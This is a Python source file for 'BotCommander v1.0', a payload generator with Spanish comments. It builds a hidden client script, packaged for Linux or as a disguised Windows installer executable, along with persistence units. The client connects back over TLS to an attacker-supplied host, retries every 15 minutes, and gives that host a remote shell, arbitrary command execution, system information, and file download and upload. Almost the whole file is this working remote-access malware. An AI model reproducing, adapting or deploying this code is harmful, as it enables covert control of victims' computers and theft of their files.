
import subprocess
import socket
import zipfile
import tarfile
import shutil
import os
import sys
from colorama import Fore, Style
from art import tprint

def file_generator(ip,port):
      
    multi_client_file = f"""
# -*- coding: utf-8 -*-
import socket
import subprocess
import os
import ssl
import platform
import time
import sys

def open_reverse_TCP():
    
    cwd = os.getcwd()
    Client_Socket_SSL.send(cwd.encode())     #envia la ruta del directorio de trabajo al server
    
    
    while True:
        # receive the command from the server
        command = Client_Socket_SSL.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
          
        if splited_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            try:
                output = subprocess.getoutput(command)
                
            except subprocess.SubprocessError as e:
                output = 'Cannot send the message'
                #print(e)
            
        # get the current working directory as output
        cwd = os.getcwd()   
        # send the results back to the server
        message = (output+SEPARATOR+cwd).encode()
        Client_Socket_SSL.send(message)
    # close client connection
    #Client_Socket_SSL.close()


def estabilish_SSL_conection(Client_Socket):
    
    context = create_context_SSL()
    Client_Socket_SSL = context.wrap_socket(Client_Socket,server_hostname = host)
    return Client_Socket_SSL
    
def create_context_SSL():
    #aqui podemos configurar el contexto
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False   #desabilitamos esta opción ya que estamos usando un ceertificado
                        			 # self-signed y TLS lo descarta al no estar expedido por una CA oficial
    context.verify_mode = ssl.CERT_NONE 
    return context

def send_file():
    # read and sends a file to the server
    #falta manejar excepciones y comprobar la existencia del fichero
    Client_Socket_SSL.send("<<Ready>>".encode())  #le dice al server que esta ok para recibir la ruta del fichero
    
    try:
        path_file = Client_Socket_SSL.recv(BUFFER_SIZE).decode() # recupera la ruta del fichero que envia el servidor 
    except socket.timeout:
        return
    
    if os.path.exists(path_file):
           
        with open(path_file, 'rb') as file:
            # Leer los datos del archivo y enviarlos al servidor
            data = file.read(1024)
            
            while data:
                
                Client_Socket_SSL.send(data)
                data = file.read(1024)
    else:
         Client_Socket_SSL.send('The file does not exist')
         return

def receive_file():
    
    
    Client_Socket_SSL.send("<<Ready>>".encode())
   
    try:
        path_file = Client_Socket_SSL.recv(BUFFER_SIZE).decode() # recupera la ruta del fichero que envia el servidor 
    except socket.timeout:
        return
    
    if os.path.exists(path_file):
        Client_Socket_SSL.send("found".encode()) 
        
        try:
            path_file = Client_Socket_SSL.recv(1024).decode() #recive la ruta completa con el nombre del fichero
        except socket.timeout:
            return
        
        with open(path_file, 'wb') as archivo:
            
            Client_Socket_SSL.settimeout(4)
            while True:
                try:
                    data = Client_Socket_SSL.recv(1024)
                    if not data:
                        break
                   
                except socket.timeout: # si entra en el timeout es el final del mensaje
                    Client_Socket_SSL.settimeout(None)
                    break
                
               
                archivo.write(data)
            return
    else:
         Client_Socket_SSL.send("not-found".encode())
         return
    
   
    

def call_handler(command):
     
     if (command == 'system-data'):
         send_data_system()
     if (command == 'reverse'):
        #execute reverse shell function
        open_reverse_TCP()
        
     if (command == 'execute'):
         execute()
     if (command == 'close-conection'):
         Client_Socket_SSL.close()
         sys.exit()         
     if (command == 'download-file'): #read and send a file to the server
        send_file()
     if (command == 'upload-file'):
        receive_file()
    
     
def send_data_system():
    #manda la informacion del sistema operativo y arquitectura de la maquina
    if(operating_system=='Windows'):
        output = subprocess.getoutput('wmic os get Caption, OSArchitecture')
        clean_output = output.replace('Caption','').replace('\\t','').replace('\\n','').replace('OSArchitecture','').lstrip()
        Client_Socket_SSL.send(clean_output.encode())
        
    if(operating_system=='Linux'):
        Client_Socket_SSL.send(subprocess.getoutput('uname -a').encode())
        
    if(operating_system!='Windows')and(operating_system!='Linux'):
        Client_Socket_SSL.send('Unrecognized system info'.encode())
    
def execute():
    
    Client_Socket_SSL.send("<<Ready>>".encode())  #le dice al server que esta ok para recibir ordenes
    command_server = Client_Socket_SSL.recv(BUFFER_SIZE).decode() # recupera la orden que envia el servidor 
    command_server = command_server.split()
    Client_Socket_SSL.send("Status: Running Process in background".encode()) # ejecuta y envia al servidor
    subprocess.Popen(command_server)  
    
if __name__ == "__main__":

    #--------GLOBALS--------------------
   
    time.sleep(10)  #esperamos a que la maquina establezca conexion con internet
  
    host = '{ip}'
    port = {port}
    BUFFER_SIZE = 1024*128
    SEPARATOR = "<Sep>"
    operating_system = platform.system()  #obtengo la información de la maquina
    RETRY_TIME = 900 # tiempo que transcurre entre cada intento de conexion con el servidor (15 minutos)
    #--------------------------------------ssl------------------------------
    
    Client_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Client_Socket_SSL = estabilish_SSL_conection(Client_Socket)
    
    #------------------------------------------------------------------------
    
    while True:
        try:

            Client_Socket_SSL.connect((host, port))
    
            while True:  # mirar cuando entre en este while y la comunicacion se pierda como volver a reconectar    
               
                command = Client_Socket_SSL.recv(BUFFER_SIZE).decode()  #always listening to the server
               
                call_handler(command)
        except socket.error as e:
            #print(str(e))
            time.sleep(RETRY_TIME)  #si no se puede conectar, volvera a intentarlo cada 15 minutos
        except Exception as e:
            time.sleep(RETRY_TIME)
            

    """
        # creamos el fichero del demonio
    with open(f'./.multi_client_client.py', 'w') as f:
        f.write(multi_client_file)
    
def get_Data():
    
    print(Fore.RED + '\n ----------------------'+ Style.RESET_ALL)
    print(Fore.RED + ' Payload Configurator'+ Style.RESET_ALL)
    print(Fore.RED + ' ----------------------\n'+ Style.RESET_ALL)
    opt = input("\n 1.- Enter the IP address of the attacker's server \n 2.- Enter Domain of the attacker's server  \n choose one option [1/2]\n")
    if(opt=='1'):
        address = input("Enter ip server. ej = 189.145.23.11 \n")
    if(opt=='2'):
        while True:
            address = str(input("Enter Domain Server ej = myserver.com \n"))
            try:
                
                address = socket.getaddrinfo(address, None)  #se resuelve la ip del dominio solicitado
                break;
            except socket.gaierror as e:
                print(f'\nError resolving host:  {e}   try again')
                
    port = int(input("\nIntro the listen port of server\n"))
    
    return address,port
    
def linux_payload():

    address,port=get_Data()
    file_generator(address,port)    
    generate_tar_payload()  #generate tar file
    
def check_pyinstaller():
    
    try:
        subprocess.run(['pyinstaller', '--version'], check=True)
    except FileNotFoundError:
        print("\nPyInstaller is not present in the system, try pip install pyinstaller.\n")
        sys.exit()
    except subprocess.CalledProcessError:
        print("\nPyInstaller is installed, but there was an error getting pyinstaller version.\n")
        sys.exit()
    print("\n Done.")
        
def windows_payload():
    
    print("\nChecking if pyinstaller is present in your device...")
    check_pyinstaller()
    print("\nWorking...")
    res = subprocess.run('pyinstaller ./windows_python_installer.py', shell=True, capture_output=True, text=True)  #genera el .exe
    address,port=get_Data()
    file_generator(address,port)    
    
    try:
        # Movemos los ficheros necesarios para que sean accesibles por windows_python_installer.py
        shutil.copy('.multi_client_client.py', 'dist/windows_python_installer/.multi_client_client.py')
        shutil.copy('windows_persistence_unit.py', 'dist/windows_python_installer/windows_persistence_unit.py')
        
    except FileNotFoundError:
        print("\nSome files could not be found\n")
   
        
    generate_zip_payload()  #generate tar file
    
    

def generate_zip_payload():
    
    with zipfile.ZipFile("payload_Windows.zip", "w") as zipf:
        
                
        for root, _, files in os.walk('./dist'):
            for file in files:
                archivo_abs = os.path.join(root, file)
                archivo_rel = os.path.relpath(archivo_abs, './dist')
                zip_rel_path = os.path.join(os.path.basename('./dist'), archivo_rel)
                zipf.write(archivo_abs, zip_rel_path)
                
        for root, _, files in os.walk('./build'):
            for file in files:
                archivo_abs = os.path.join(root, file)
                archivo_rel = os.path.relpath(archivo_abs, './build')
                zip_rel_path = os.path.join(os.path.basename('./build'), archivo_rel)
            
    clean_directory()
    print(Fore.MAGENTA + '\n\nFile ./payload_Windows.zip was created successfully, The executable Payload is allocated in /dist/python_windows_installer/python_windows_installer.exe\n\n'+ Style.RESET_ALL)
    

def clean_directory():
        
    try:
        shutil.rmtree('dist')
        shutil.rmtree('build')
        os.remove('windows_python_installer.spec')
        os.remove('.multi_client_client.py')
    except OSError as error:
        print(error)

def generate_tar_payload(): 
    
    with tarfile.open("payload_linux.tar.gz", "w:gz") as tar:
        
        tar.add(".linux_persistence_unit.py")
        tar.add("linux_python_installer.sh")
        tar.add(".multi_client_client.py")
        
    os.remove('.multi_client_client.py')
    print(Fore.MAGENTA + '\n\nFile ./payload_linux.tar.gz was created successfully\n'+ Style.RESET_ALL)
    

if __name__=="__main__":
 
    tprint('\nBotCommander\n v1.0')
    print(Fore.CYAN + '\nPayload Generator\n'+ Style.RESET_ALL)
    print(Fore.MAGENTA + 'Powered by CSM®\n'+ Style.RESET_ALL)
    print("1. Generate Linux Payload")
    print("2. Generate Windows Payload")
    
    option=input("Choose one:\n")
    
    if(option=='1'):
        #generate linux payload
        linux_payload()
        
    if(option=='2'):
        #generate windows payload
        windows_payload()